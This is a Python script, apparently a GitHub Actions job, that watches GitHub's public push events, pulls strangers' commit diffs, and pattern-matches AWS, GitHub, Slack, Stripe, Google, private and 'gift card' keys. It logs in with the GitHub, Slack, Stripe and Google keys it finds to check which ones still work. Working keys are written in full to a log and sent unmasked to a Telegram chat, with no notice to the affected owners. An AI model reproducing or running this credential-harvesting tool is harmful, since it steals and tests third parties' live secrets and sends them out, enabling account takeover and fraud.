#!/usr/bin/env python3
"""GitHub Secret Scanner – GitHub Actions (stateless, single run)"""
import asyncio
import aiohttp
import logging
import re
import math
import sys
import json
import time
import os
from datetime import datetime, timezone, timedelta
import requests
from collections import Counter

# --- Config ---
VERIFY_CONCURRENCY = 10
LOG_FILE = "live_keys.log"
ENTROPY_THRESHOLD = 3.5
MIN_ENTROPY_STRING_LENGTH = 16
MAX_ENTROPY_STRING_LENGTH = 128
LAST_TIMESTAMP_FILE = "last_timestamp.txt"

# --- Telegram ---
TELEGRAM_TOKEN = os.environ.get("TELEGRAM_TOKEN", "")
TELEGRAM_CHAT_ID = os.environ.get("TELEGRAM_CHAT_ID", "")

def send_telegram(msg):
    """Sends a message to a Telegram chat if credentials are provided."""
    if not TELEGRAM_TOKEN or not TELEGRAM_CHAT_ID:
        return
    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
    try:
        requests.post(url, json={"chat_id": TELEGRAM_CHAT_ID, "text": msg}, timeout=10)
    except requests.exceptions.RequestException as e:
        logging.error(f"Failed to send Telegram message: {e}")
    except Exception as e:
        logging.error(f"An unexpected error occurred sending Telegram message: {e}")

# --- Patterns ---
PATTERNS = [
    (r'(?:A3T[A-Z0-9]|AKIA|ASIA)[A-Z0-9]{16}', 'AWS Access Key', None),
    (r'(?i)aws(.{0,20})?(?-i)["\']([0-9a-zA-Z\/+]{40})["\']', 'AWS Secret Key', None),
    (r'(ghp|gho|ghu|ghs|ghr)_[A-Za-z0-9_]{36,}', 'GitHub Token', 'verify_github'),
    (r'xox[baprs]-[a-zA-Z0-9-]+', 'Slack Token', 'verify_slack'),
    (r'sk_live_[0-9a-zA-Z]{24,}', 'Stripe Live Key', 'verify_stripe'),
    (r'AIza[0-9A-Za-z\-_]{35}', 'Google API Key', 'verify_google'),
    (r'-----BEGIN (RSA|EC|DSA|OPENSSH) PRIVATE KEY-----', 'Private Key', None),
    (r'(?i)(giftcard|reward|loyalty)(_key|_token|secret)\s*[:=]\s*["\']([a-zA-Z0-9_\-]{32,64})["\']', 'Gift Card Key', None),
]

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [%(levelname)s] %(message)s',
    stream=sys.stdout
)
logger = logging.getLogger(__name__)

def shannon_entropy(data: str) -> float:
    """Calculates the Shannon entropy of a string."""
    if not data:
        return 0.0
    n = len(data)
    counts = Counter(data)
    entropy = 0.0
    for count in counts.values():
        p_x = count / n
        if p_x > 0:
            entropy -= p_x * math.log2(p_x)
    return entropy

def extract_strings_from_diff(diff_text):
    """Extracts potential secret candidates from diff lines."""
    candidates = []
    # FIXED: Use proper f-string for regex with variable length
    token_pattern = re.compile(
        rf'["\']([^"\']{{{MIN_ENTROPY_STRING_LENGTH},}})["\']|\b([A-Za-z0-9_\-+/=]{{{MIN_ENTROPY_STRING_LENGTH},}})\b'
    )
    
    for line in diff_text.split('\n'):
        if line.startswith('+') and not line.startswith('+++'):
            content = line[1:].strip()
            matches = token_pattern.findall(content)
            for t in matches:
                token = t[0] if t[0] else t[1]
                if len(token) >= MIN_ENTROPY_STRING_LENGTH:
                    candidates.append(token)
    return candidates

def scan_diff(diff_text):
    """Scans diff text for known patterns and high-entropy strings."""
    findings = []
    compiled_patterns = [(re.compile(pattern, re.IGNORECASE | re.MULTILINE), service, verifier)
                         for pattern, service, verifier in PATTERNS]

    for pattern, service, verifier in compiled_patterns:
        matches = pattern.findall(diff_text)
        for match in matches:
            if isinstance(match, tuple):
                token = next((m for m in match if isinstance(m, str) and len(m) > 10), None)
            else:
                token = match
            
            if token:
                findings.append({'token': token, 'service': service, 'verifier': verifier})

    seen_tokens = {f['token'] for f in findings}
    
    for token in extract_strings_from_diff(diff_text):
        if token in seen_tokens or len(token) > MAX_ENTROPY_STRING_LENGTH:
            continue
        if shannon_entropy(token) >= ENTROPY_THRESHOLD:
            findings.append({'token': token, 'service': 'High Entropy String', 'verifier': None})
    
    return findings

class GitHub:
    """Handles interactions with the GitHub API."""
    def __init__(self, token):
        self.token = token
        self.session = None

    async def _init_session(self):
        """Initializes the aiohttp ClientSession if it doesn't exist."""
        if not self.session or self.session.closed:
            try:
                self.session = aiohttp.ClientSession(
                    headers={'Authorization': f'token {self.token}', 'Accept': 'application/vnd.github.v3+json'},
                    timeout=aiohttp.ClientTimeout(total=30)
                )
            except Exception as e:
                logger.error(f"Failed to initialize aiohttp ClientSession: {e}")
                raise

    async def fetch_events_since(self, since_iso):
        """Fetches push events from the GitHub API since a given timestamp."""
        await self._init_session()
        url = 'https://api.github.com/events'
        params = {'per_page': 100, 'since': since_iso}
        
        for attempt in range(3):
            try:
                async with self.session.get(url, params=params) as resp:
                    if resp.status == 403 and resp.headers.get('X-RateLimit-Remaining') == '0':
                        reset_time = int(resp.headers.get('X-RateLimit-Reset', time.time() + 60))
                        sleep_duration = max(reset_time - time.time(), 1)
                        logger.warning(f"Rate limited by GitHub API. Sleeping for {sleep_duration:.2f}s.")
                        await asyncio.sleep(sleep_duration)
                        continue
                    
                    if resp.status != 200:
                        logger.error(f"Error fetching events. Status: {resp.status}")
                        return []
                    
                    events = await resp.json()
                    return [e for e in events if e.get('type') == 'PushEvent']
            
            except aiohttp.ClientError as e:
                logger.warning(f"Attempt {attempt+1} failed (client error): {e}")
            except asyncio.TimeoutError:
                logger.warning(f"Attempt {attempt+1} failed (timeout)")
            except Exception as e:
                logger.warning(f"Attempt {attempt+1} failed (unexpected): {e}")
            
            if attempt < 2:
                await asyncio.sleep(1.5 * (attempt + 1))
        
        logger.error("Failed to fetch events after multiple attempts.")
        return []

    async def get_diff(self, repo, sha):
        """Fetches the diff for a specific commit in a repository."""
        await self._init_session()
        url = f'https://api.github.com/repos/{repo}/commits/{sha}'
        headers = {'Accept': 'application/vnd.github.v3.diff'}
        
        try:
            async with self.session.get(url, headers=headers) as resp:
                if resp.status == 200:
                    return await resp.text()
                elif resp.status == 404:
                    logger.warning(f"Commit {sha[:7]} not found in {repo}.")
                else:
                    logger.warning(f"Failed to get diff for {repo}@{sha[:7]}. Status: {resp.status}")
        except aiohttp.ClientError as e:
            logger.warning(f"Network error fetching diff for {repo}@{sha[:7]}: {e}")
        except asyncio.TimeoutError:
            logger.warning(f"Timeout fetching diff for {repo}@{sha[:7]}.")
        except Exception as e:
            logger.warning(f"Unexpected error fetching diff for {repo}@{sha[:7]}: {e}")
        return None

    async def close(self):
        """Closes the aiohttp ClientSession."""
        if self.session and not self.session.closed:
            await self.session.close()
            logger.debug("GitHub session closed.")

async def verifier_class(session: aiohttp.ClientSession = None):
    """Factory function to create verifier coroutines."""
    semaphore = asyncio.Semaphore(VERIFY_CONCURRENCY)
    client_session = session if session else aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=10))

    async def gh_verify(token):
        """Verifies GitHub token by calling the API."""
        async with semaphore:
            try:
                async with client_session.get('https://api.github.com/user', headers={'Authorization': f'token {token}'}) as resp:
                    return resp.status == 200
            except (aiohttp.ClientError, asyncio.TimeoutError, Exception):
                return False

    async def slack_verify(token):
        """Verifies Slack token by calling Slack API's auth.test."""
        async with semaphore:
            try:
                async with client_session.post('https://slack.com/api/auth.test', headers={'Authorization': f'Bearer {token}'}) as resp:
                    if resp.status == 200:
                        data = await resp.json()
                        return data.get('ok', False)
                    return False
            except (aiohttp.ClientError, asyncio.TimeoutError, Exception):
                return False

    async def stripe_verify(key):
        """Verifies Stripe key by attempting to access the balance endpoint."""
        async with semaphore:
            try:
                async with client_session.get('https://api.stripe.com/v1/balance', headers={'Authorization': f'Bearer {key}'}) as resp:
                    return resp.status == 200
            except (aiohttp.ClientError, asyncio.TimeoutError, Exception):
                return False

    async def google_verify(key):
        """Verifies Google API key/access token using the tokeninfo endpoint."""
        async with semaphore:
            try:
                async with client_session.get('https://www.googleapis.com/oauth2/v1/tokeninfo', params={'access_token': key}) as resp:
                    return resp.status == 200
            except (aiohttp.ClientError, asyncio.TimeoutError, Exception):
                return False
            
    return gh_verify, slack_verify, stripe_verify, google_verify, client_session

async def get_last_timestamp():
    """Reads the last processed timestamp from a file."""
    try:
        with open(LAST_TIMESTAMP_FILE, 'r') as f:
            last_ts = f.read().strip()
            datetime.fromisoformat(last_ts.replace('Z', '+00:00'))
            return last_ts
    except FileNotFoundError:
        logger.info(f"Timestamp file '{LAST_TIMESTAMP_FILE}' not found. Using 1 hour ago.")
        return (datetime.now(timezone.utc) - timedelta(hours=1)).strftime('%Y-%m-%dT%H:%M:%SZ')
    except ValueError:
        logger.warning(f"Invalid timestamp format in '{LAST_TIMESTAMP_FILE}'. Using 1 hour ago.")
        return (datetime.now(timezone.utc) - timedelta(hours=1)).strftime('%Y-%m-%dT%H:%M:%SZ')

def update_last_timestamp():
    """Writes the current timestamp to a file."""
    new_ts = datetime.now(timezone.utc).strftime('%Y-%m-%dT%H:%M:%SZ')
    try:
        with open(LAST_TIMESTAMP_FILE, 'w') as f:
            f.write(new_ts)
        logger.debug(f"Updated timestamp to {new_ts}")
        return new_ts
    except IOError as e:
        logger.error(f"Failed to write timestamp to {LAST_TIMESTAMP_FILE}: {e}")
        return None

async def main():
    """Main function to orchestrate the scanning process."""
    start_time = time.time()
    logger.info("Starting GitHub Secret Scanner run...")

    github_token = os.environ.get("GITHUB_TOKEN")
    if not github_token:
        logger.error("GITHUB_TOKEN environment variable is not set. Exiting.")
        sys.exit(1)

    github_client = GitHub(github_token)
    verifier_session = None  # FIXED: Initialize before try block
    
    try:
        since_iso = await get_last_timestamp()
        logger.info(f"Fetching events since: {since_iso}")
        
        events = await github_client.fetch_events_since(since_iso)
        
        if not events:
            logger.info("No new events found. Exiting.")
            # FIXED: Always update timestamp even when no events found
            update_last_timestamp()
            return

        logger.info(f"Fetched {len(events)} PushEvents.")
        
        v_gh, v_slack, v_stripe, v_google, verifier_session = await verifier_class(github_client.session)
        
        for ev in events:
            repo_name = ev.get('repo', {}).get('name')
            for commit in ev.get('payload', {}).get('commits', []):
                commit_sha = commit.get('sha')
                
                if not repo_name or not commit_sha:
                    continue
                    
                diff_text = await github_client.get_diff(repo_name, commit_sha)
                
                if not diff_text:
                    logger.warning(f"Skipping {repo_name}@{commit_sha[:7]} - no diff retrieved")
                    continue
                logger.info(f"Scanning {repo_name}@{commit_sha[:7]} ({len(diff_text)} bytes)")

                    
                findings = scan_diff(diff_text)
                
                if not findings:
                    continue
                    
                logger.info(f"Found {len(findings)} potential secret candidate(s) in {repo_name}@{commit_sha[:7]}")
                
                for f in findings:
                    token_value = f['token']
                    service_name = f['service']
                    verifier_func_name = f['verifier']
                    
                    valid = None
                    
                    if verifier_func_name == 'verify_github':
                        valid = await v_gh(token_value)
                    elif verifier_func_name == 'verify_slack':
                        valid = await v_slack(token_value)
                    elif verifier_func_name == 'verify_stripe':
                        valid = await v_stripe(token_value)
                    elif verifier_func_name == 'verify_google':
                        valid = await v_google(token_value)
                    
                    if valid is True:
                        alert_message = f"[LIVE KEY] {service_name}: {token_value} (Repo: {repo_name}, Commit: {commit_sha})"
                        logger.warning(alert_message)
                        
                        try:
                            with open(LOG_FILE, 'a') as lf:
                                lf.write(json.dumps({'timestamp': datetime.now(timezone.utc).isoformat(), 'finding': f, 'repo': repo_name, 'commit': commit_sha}) + '\n')
                        except IOError as e:
                            logger.error(f"Failed to write to log file {LOG_FILE}: {e}")
                        
                        send_telegram(alert_message)
                        
                    elif valid is False:
                        logger.info(f"[DEAD] {service_name}: {token_value[:20]}...")
                    else:
                        logger.info(f"[UNKNOWN] {service_name}: {token_value[:20]}...")

        # FIXED: Always update timestamp after processing events
        update_last_timestamp()

    finally:
        await github_client.close()
        if verifier_session and verifier_session is not github_client.session and not verifier_session.closed:
            await verifier_session.close()

    end_time = time.time()
    logger.info(f"GitHub Secret Scanner run finished. Total time: {end_time - start_time:.2f} seconds.")

if __name__ == '__main__':
    try:
        with open(LOG_FILE, 'a'):
            pass
    except IOError as e:
        logger.error(f"Could not access log file '{LOG_FILE}': {e}. Exiting.")
        sys.exit(1)

    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        logger.info("Scanner interrupted by user. Exiting gracefully.")
        sys.exit(0)
